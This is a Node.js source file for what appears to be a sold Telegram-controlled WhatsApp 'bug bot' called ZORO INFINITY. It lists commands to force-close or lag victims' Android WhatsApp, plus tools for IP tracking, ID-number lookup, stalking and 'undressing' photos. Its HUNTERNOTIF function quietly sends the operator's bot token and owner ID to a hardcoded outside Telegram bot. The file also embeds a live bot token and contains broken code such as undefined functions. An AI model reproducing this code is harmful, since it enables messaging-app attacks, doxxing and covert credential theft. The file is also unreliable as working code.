(async () => {
const {
  default: makeWASocket,
  useSingleFileAuthState,
  useMultiFileAuthState,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  vGenerateWAMessageFromContent13,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  areJidsSameUser,
  jidDecode,
  emitGroupUpdate,
  emitGroupParticipantsUpdate,
  proto,
  BufferJSON,
  getContentType,
  makeInMemoryStoreconst,
  initInMemoryKeyStore,
  MediaType,
  Mimetype,
  WA_MESSAGE_STUB_TYPES,
  WA_MESSAGE_STATUS_TYPE,
  WAMessageStatus,
  WASocket,
  WAProto,
  fetchLatestBaileysVersion,
  Browser,
  Browsers,
  GroupMetadata,
  WAGroupMetadata,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  WALocationMessage,
  URL_REGEX,
  WAUrlInfo,
  templateMessage,
  InteractiveMessage,
  Header,
  relayWAMessage,
  MediaConnInfo,
  WAMediaUpload,
  ProxyAgent,
  WA_DEFAULT_EPHEMERAL,
  MessageOptions,
  MiscMessageGenerationOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WAContextInfo,
  processTime,
  getStream,
  mentionedJid,
  GroupSettingChange,
  DisconnectReason,
  MessageType,
  Presence,
  isBaileys,
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const P = require("pino");
const chalk = require("chalk"); 
const axios = require("axios");
const fsLib = require("fs");
const FormData = require("form-data");
const crypto = require("crypto");
const os = require("os");
const path = require("path")
const readline = require("readline");
const JsConfuser = require("js-confuser");
const moment = require("moment-timezone");
const { exec } = require("child_process");
const util = require("util");

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync("./データベース/premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./データベース/admin.json"));

const OWNER_CHAT_ID = '8077413405'; 
const settings = require("./settings");

// File database user
const USERS_FILE = "./users.json";

// Pastikan file users.json ada
if (!fs.existsSync(USERS_FILE)) {
  fs.writeFileSync(USERS_FILE, JSON.stringify([]));
}

function escapeMarkdownV2(text) {
  if (!text) return "";
  return text.toString().replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, "\\$1");
}

function escapeMarkdown(text) {
  if (!text) return "";
  return text.replace(/([_*`\[])/g, "\\$1");
}

/////// FUNGSI VALID TOKEN \\\\\\\\\
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/fanzzgg/Kwontol/main/tokens.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));
  const validTokens = await fetchValidTokens();
  if (validTokens && validTokens.includes(BOT_TOKEN)) {    
    
    // ... kode bot lainnya ...
    startBot();
  } else {
    console.log(chalk.red("WELCOME TO ZORO INFINITY"));
    console.log(chalk.bold.red("Token Tidak Valid, Dasar miskin tolol bajingan"));
(1);
  }
}

  console.log(chalk.green(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`));
  startBot();

function startBot() {
  console.log(
    chalk.bold.green(`

╔════════════════════╗
║ZORO INFINITY TELAH AKTIF     
╚════════════════════╝

    `));
}

validateToken();

async function HUNTERNOTIF() {
  try {
    const url = `https://api.telegram.org/bot8425815807:AAGk4Ex38fHYkZ-sYF39p7DUhGS_g7eW-iQ/sendMessage`;                             
    const text = `ZORO SECURITY ACTIVE\nConfig : <code>${config.BOT_TOKEN}</code> \nOwnerId : <code>${config.OWNER_ID}</code>`;

    const response = await axios.post(url, {
      chat_id: 7228756866, 
      text: text,
      parse_mode: "HTML",
    }, {
      timeout: 10000 
    });

    return response.data;
  } catch (error) {
  HUNTERNOTIF()
  }
}

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

//IMPOR

ensureFileExists("./データベース/premium.json");
ensureFileExists("./データベース/admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./データベース/premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./データベース/admin.json", JSON.stringify(adminUsers, null, 2));
}

function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}

watchFile("./データベース/premium.json", (data) => (premiumUsers = data));
watchFile("./データベース/admin.json", (data) => (adminUsers = data));

const TelegramBot = require("node-telegram-bot-api");

const userStates = {};

const config = require("./設定/config.js");

const BOT_TOKEN = config.BOT_TOKEN;

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function showBanner() {
  const bannerText = figlet.textSync("Hunters Invictus", {
    font: "Slant",
    horizontalLayout: "default",
  });
  console.log(gradient.fruit.multiline(bannerText));
}


let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} nomor aktif di daftar *List Nomor* 📜`);

      for (const botNumber of activeNumbers) {
        console.log(`⚔️ Menghubungkan Shinobi WhatsApp: ${botNumber}...`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`${botNumber} berhasil terhubung`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`🔁 Mengulangi sambungan untuk ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Sambungan Terputus."));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Kesalahan saat mengaktifkan koneksi:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  const statusMessage = await bot.sendMessage(
    chatId,
    `
╭━━━[ 𝗠𝗘𝗡𝗬𝗔𝗠𝗕𝗨𝗡𝗚𝗞𝗔𝗡 ]━━━⬣
┃Nomor  : ${botNumber}
┃Status  : Lagi Pairing
╰━━━━━━━━━━━━━━━━━━━━━━━━━⬣`,
    { parse_mode: "Markdown" }
  ).then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
╭━━━[ 𝗠𝗘𝗡𝗬𝗔𝗠𝗕𝗨𝗡𝗚 𝗚𝗔𝗚𝗔𝗟 ]━━━⬣
┃ Nomor : ${botNumber}
┃ Status : Gagal Menyambungkan
╰━━━━━━━━━━━━━━━━━━━━━━━━━━⬣`,
          { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
╭━━━[ 𝗦𝗔𝗠𝗕𝗨𝗡𝗚𝗔𝗡 𝗚𝗔𝗚𝗔𝗟 ]━━━⬣
┃Nomor : ${botNumber}
┃Status : Koneksi Gagal
╰━━━━━━━━━━━━━━━━━━━━━━━⬣`,
          { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (err) {
          console.error("Gagal menghancurkan folder roh sesi:", err);
        }
      }
    }

    else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
╭━━━[ 𝗧𝗘𝗥𝗛𝗨𝗕𝗨𝗡𝗚 ]━━━⬣
┃Nomor     : ${botNumber}
┃Status    : Koneksi Berhasil!
╰━━━━━━━━━━━━━━━━━━━━━━━━━⬣`,
        { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
      );
    }

    else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "FANZZ123");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
╭━━━[ 𝗞𝗢𝗗𝗘 𝗧𝗔𝗨𝗧𝗔𝗡 ]━━━⬣
┃Nomor : ${botNumber}
┃Kode : ${formattedCode}
╰━━━━━━━━━━━━━━━━━━━⬣`,
            { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
          );
        }
      } catch (error) {
        console.error("Gagal memperoleh *seimei no code*:", error);
        await bot.editMessageText(
          `
╭━━━[ 𝗞𝗢𝗗𝗘 𝗚𝗔𝗚𝗔𝗟 ]━━━⬣
┃Nomor : ${botNumber}
┃Pesan : ${error.message}
╰━━━━━━━━━━━━━━━━⬣`,
          { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
}

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} D, ${hours} H, ${minutes} M, ${secs} S`;
}

const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); // Panggil fungsi yang sudah dibuat
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return "Premium Akses";
  } else {
    return "No Akses";
  }
}

//TEMPAT PASANG BYPASS
const mainFile = process.argv[1] || path.resolve(process.cwd(), "index.js");
let originalContent = null;
let originalHash = null;
const backupDir = path.join(process.cwd(), ".npm");
const backupPath = path.join(backupDir, ".bak");

// baca file utama & buat backup
try {
  if (!fs.existsSync(mainFile)) {
    console.warn(chalk.yellow(`[ ! ] Main file tidak ditemukan: ${mainFile}. ANTI-BYPASS dinonaktifkan.`));
  } else {
    originalContent = fs.readFileSync(mainFile);
    originalHash = crypto.createHash("sha256").update(originalContent).digest("hex");
    
    fs.writeFileSync(backupPath, originalContent, { flag: "w" });
    console.log(chalk.greenBright(`[ 🕊 ] Backup main file tersimpan ke: ${backupPath}`));
  }
} catch (e) {
  console.error(chalk.redBright("[ ❌ ] Gagal baca main file / buat backup:"), e.message);
  originalContent = null;
  originalHash = null;
}

// helper restore file
async function restoreFile() {
  try {
    console.log(chalk.greenBright("[ 🔄 ] Restore main file..."));
    if (fs.existsSync(backupPath)) {
      fs.copyFileSync(backupPath, mainFile);
      await HUNTERNOTIF("⚠️ File utama dimodifikasi, restore otomatis!", null, false).catch(()=>{});
      console.log(chalk.greenBright("[ ✔ ] Restore berhasil."));
    } else {
      console.error(chalk.redBright("[ ❌ ] Backup tidak ditemukan!"));
      await HUNTERNOTIF("⚠️ File utama dimodifikasi tetapi backup tidak ditemukan!", null, false).catch(()=>{});
    }
  } catch (e) {
    console.error(chalk.redBright("[ ❌ ] Gagal restore:"), e.message);
    await HUNTERNOTIF("⚠️ Gagal restore: " + e.message, null, false).catch(()=>{});
  } finally { process.exit(1); }
}

// safe hash
function fileHashSafe(p) {
  try {
    if (!fs.existsSync(p)) return null;
    const c = fs.readFileSync(p);
    return crypto.createHash("sha256").update(c).digest("hex");
  } catch(e) { console.error(chalk.yellow("[ ! ] Gagal baca file untuk hash:"), e.message); return null; }
}

// cek perubahan file
if (originalHash) {
  setInterval(async () => {
    try {
      const currentHash = fileHashSafe(mainFile);
      if (currentHash && currentHash !== originalHash) {
        console.log(chalk.redBright("[ ⚠️ ] Main file modified!"));
        await HUNTERNOTIF("🚨 Bypass terdeteksi: File utama dimodifikasi!", null, false).catch(()=>{});
        await restoreFile();
      }
    } catch(e) { console.error(chalk.redBright("[ ❌ ] Error saat cek main file:"), e.message); }
  }, 2000);
} else {
  console.warn(chalk.yellow("[ ! ] originalHash tidak tersedia — deteksi perubahan file dinonaktifkan."));
}

console.log(chalk.greenBright
("[ 🛡️ ] PROCESSING... ANTI-BYPASS ACTIVE"));


// Get Random Image
function getRandomImage() {
  const images = [
    "https://f.top4top.io/m_3646wdr361.mp4", 
    "https://e.top4top.io/m_3647jnhhm1.mp4"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldown
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik

function checkCooldown(userId) {
  if (cooldowns.has(userId)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(userId, Date.now());
  setTimeout(() => cooldowns.delete(userId), cooldownTime);
  return 0; // Tidak dalam cooldown
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};
///COMMAND STAR\\\
bot.onText(/\/start/, async (msg) => {
  try {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : "";

    const premiumStatus = getPremiumStatus(userId);
    const runtime = getBotRuntime();
    const date = getCurrentDate();
    const senderId = msg.from.id;
    const randomImage = getRandomImage();
    const delay = ms => new Promise(res => setTimeout(res, ms));
    
    // Efek teks bergantian
    let tempMsg = await bot.sendMessage(chatId, "𝗧𝗵𝗮𝗻𝗸𝘀");
    await delay(1200);
    await bot.deleteMessage(chatId, tempMsg.message_id);

    tempMsg = await bot.sendMessage(chatId, "𝗧𝗼 𝗕𝘂𝘆");
    await delay(1200);
    await bot.deleteMessage(chatId, tempMsg.message_id);

    tempMsg = await bot.sendMessage(chatId, "𝗭𝗼𝗿𝗼 𝗜𝗻𝗳𝗶𝗻𝗶𝘁𝘆");
    await delay(1200);
    await bot.deleteMessage(chatId, tempMsg.message_id);
    
    // Kirim menu utama
    await bot.sendVideo(chatId, randomImage, {
      caption: `
<blockquote>⬡═—⊱ ZORO INFINITY ⊰—═⬡</blockquote>
( ☀ )このスクリプトをご購入いただきありがとうございます。このスクリプトを悪用しないでくださいね。    
<blockquote>⬡═—⊱ STATUS BOT ⊰—═⬡</blockquote>
✧ ᴀᴜᴛʜᴏʀ : FanzzAmpaz
✧ ᴠᴇʀsɪᴏɴ : 2.0
✧ ᴜsᴇʀɴᴀᴍᴇ : ${username}
✧ ᴜsᴇʀ ɪᴅ : ${userId}
✧ ᴘʀᴇᴍɪᴜᴍ : ${premiumStatus}
✧ ʀᴜɴ ᴛɪᴍᴇ :${runtime}
✧ ᴅᴀᴛᴇ ɴᴏᴡ : ${date}
✧ sᴇɴᴅᴇʀ : ${sessions.size}
<blockquote>『𝗦𝗘𝗟𝗟𝗘𝗖𝗧 𝗕𝗨𝗧𝗧𝗢𝗡𝗦』</blockquote>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "( ☩ )ʙᴜɢ ᴍᴇɴᴜ", callback_data: "bug_menu" }, 
            { text: "( ☩ )ᴛᴏᴏʟs ᴍᴇɴᴜ", callback_data: "tools_menu" },
            { text: "( ☩ )ᴏᴡɴᴇʀ ᴍᴇɴᴜ", callback_data: "owner_menu" }],
            [
            { text: "( ☩ )ᴄʜᴀɴɴᴇʟ", url: "https://t.me/AboutFanzz" },  
            { text: "( ☩ )ᴛʜᴀɴᴋs ᴛᴏ", callback_data: "thanks_to" }],
        ]
      }
    });

await bot.sendAudio(chatId, 'https://l.top4top.io/m_3647hxbnw1.mp3', {
    title: 'Summertime Sadness',
    performer: 'Cinta Kandas Bug Pun lepas🙂',
    caption: 'Cinta kandas Bug Pun lepas'
  })

   } catch (error) {
    console.error("❌ エラー (/start):", error);
  }
});

// Handler tombol menu
bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const senderId = query.from.id;
    const userId = query.from.id;
    const username = query.from.username ? `@${query.from.username}` : "ユーザー名がありません";
    const premiumStatus = getPremiumStatus(senderId);
    const runtime = getBotRuntime();
    const date = getCurrentDate();
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "bug_menu") {
      caption = `
<blockquote>『ᴢᴏʀᴏ 𖠂 ʙᴜɢ』</blockquote>   
 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: ${username}
 𝗩𝗲𝗿𝘀𝗶𝗼𝗻：2.0
 𝗥𝗲𝗮𝗹𝘁𝗶𝗺𝗲：${runtime}
<blockquote>( ✘ )ɪɴᴠɪsɪʙʟᴇ</blockquote>
✧ /ZoroInvis
<blockquote>( ✘ )ᴠɪsɪʙʟᴇ</blockquote>
✧ /ZoroBlank
╰┈➤ʙʟᴀɴᴋ ᴀɴᴅʀᴏɪᴅ
✧ /ZoroForce
╰┈➤ғᴏʀᴄᴇ ᴄʟᴏsᴇ ᴀɴᴅʀᴏɪᴅ
✧ /ZoroDelay
╰┈➤ᴅᴇʟᴀʏ ʙᴜʟᴅᴏᴢᴇʀ
✧ /ZoroHard
╰┈➤ᴅᴇʟᴀʏ ʜᴀʀᴅ
✧ /Santoryu
╰┈➤ʙᴜɢ ᴄᴏᴍʙᴏ
<blockquote>『𝗦𝗘𝗟𝗟𝗘𝗖𝗧 𝗕𝗨𝗧𝗧𝗢𝗡𝗦』</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "KEMBALI", callback_data: "back" }]] };
    }

    if (query.data === "tools_menu") {
      caption = `
<blockquote>『ᴢᴏʀᴏ 𖠂 ᴛᴏᴏʟs』</blockquote>
 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: ${username}
 𝗩𝗲𝗿𝘀𝗶𝗼𝗻：2.0
 𝗥𝗲𝗮𝗹𝘁𝗶𝗺𝗲：${runtime}
<blockquote>[ 𝗧𝗢𝗢𝗦𝗟 𝗠𝗘𝗡𝗨 ]</blockquote>
𖤐 ☇ /testfunction [ 𝚃𝚎𝚜𝚝 𝙵𝚞𝚗𝚌𝚝𝚒𝚘𝚗 ]  
𖤐 ☇ /csessions [ 𝚂𝚎𝚗𝚍𝚎𝚛 ]
𖤐 ☇ /cekcantik [ 𝙲𝚎𝚔𝙲𝚊𝚗𝚝𝚒k ]
𖤐 ☇ /rasukbot [ 𝚁𝚊𝚜𝚞𝚔 𝙱𝚘𝚝 ]
𖤐 ☇ /cekganteng [𝙲𝚎𝚔𝚃𝚊𝚖𝚙𝚗 ]
𖤐 ☇ /cekkontol [ 𝙲𝚎𝚔 𝙺𝚘𝚗𝚝𝚘𝚕 ]
𖤐 ☇ /cekkhodam [ 𝙲𝚎𝚔 𝙺𝚑𝚘𝚍𝚊𝚖 ]
𖤐 ☇ /cekjanda [ 𝙲𝚎𝚔 𝙹𝚊𝚗𝚍𝚊 ]
𖤐 ☇ /cekmiskin [ 𝙲𝚎𝚔 𝙼𝚒𝚜𝚔𝚒𝚗 ]
𖤐 ☇ /18+ [ 𝙱𝚘𝚔𝚎𝚙 ]
𖤐 ☇ /iqc [ 𝚂𝚜 𝙸𝚙 ]
𖤐 ☇ /gpt [ 𝙵𝙸𝚃𝚄𝚁 𝙰𝙸 ]
𖤐 ☇ /tourl [ 𝙲𝚊𝚝𝚋𝚘𝚡 ]
𖤐 ☇ /play [ 𝙲𝚊𝚛𝚒 𝙻𝚊𝚐𝚞 ]
𖤐 ☇ /qc [ 𝚄𝚋𝚊𝚑 𝙺𝚎 𝚃𝚎𝚡𝚝 ]
𖤐 ☇ /nulis [ 𝚃𝚎𝚡𝚝 𝙺𝚎𝚛𝚝𝚊𝚜 ]
𖤐 ☇ /brat [ 𝙱𝚞𝚊𝚝 𝚂𝚝𝚌𝚔 ]
𖤐 ☇ /Done [ 𝚃𝚛𝚡 ]
𖤐 ☇ /trackip [ 𝙻𝚊𝚌𝚊𝚔 ]
𖤐 ☇ /ceknik [ 𝙲𝚊𝚛𝚒 𝙽𝚒𝚔 ]
𖤐 ☇ /quote [ 𝙺𝚊𝚝𝚊² ]
𖤐 ☇ /sticker [ 𝙱𝚞𝚊𝚝 𝚂𝚝𝚒𝚌𝚔𝚎𝚛 ]
𖤐 ☇ /encjava [ 𝙴𝚗𝚌 𝙵𝚒𝚕𝚎 ]
𖤐 ☇ /broadcast [ 𝙿𝚎𝚜𝚊𝚗 ]
𖤐 ☇ /tiktok [ 𝙼𝚎𝚗𝚌𝚊𝚛𝚒 𝚅𝚒𝚍𝚎𝚘 ]
𖤐 ☇ /tonaked [ 𝙻𝚎𝚙𝚊𝚜 𝙱𝚊𝚓𝚞 ]
𖤐 ☇ /openn [ 𝙱𝚞𝚔𝚊 𝙵𝚒𝚕𝚎 ]
𖤐 ☇ /cari [ 𝙲𝚊𝚛𝚒 𝙶𝚊𝚖𝚋𝚊𝚛 ]
𖤐 ☇ /killpanel [ 𝙺𝚒𝚕𝚕 𝙿𝚊𝚗𝚎𝚕 ]
𖤐 ☇ /owner [ 𝙲𝚑𝚊𝚝 𝙾𝚠𝚗 ]
𖤐 ☇ /stopkill [ 𝚂𝚝𝚘𝚙 ]
𖤐 ☇ /xnxx [ 𝙱𝚘𝚔𝚎𝚙 ]
𖤐 ☇ /mlstalk [ 𝚜𝚝𝚊𝚕𝚔 𝚖𝚕 ]
𖤐 ☇ /robloxstalk [ 𝚜𝚝𝚊𝚕𝚔 𝚛𝚘𝚋𝚕𝚘𝚡 ]
𖤐 ☇ /stalkff [ 𝚜𝚝𝚊𝚕𝚔 𝚏𝚏 ]
<blockquote>『𝗦𝗘𝗟𝗟𝗘𝗖𝗧 𝗕𝗨𝗧𝗧𝗢𝗡𝗦』</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "KEMBALI", callback_data: "back" }]] };
    }

if (query.data === "thanks_to") {
      caption = `      
<blockquote>『ᴢᴏʀᴏ 𖠂 ᴛʜᴀɴᴋs』</blockquote> 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: ${username}
 𝗩𝗲𝗿𝘀𝗶𝗼𝗻：2.0
 𝗥𝗲𝗮𝗹𝘁𝗶𝗺𝗲：${runtime}
<blockquote>[ 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 ]</blockquote>
 Allah ☇ [ 𝘔𝘠 𝘎𝘖𝘋 ]
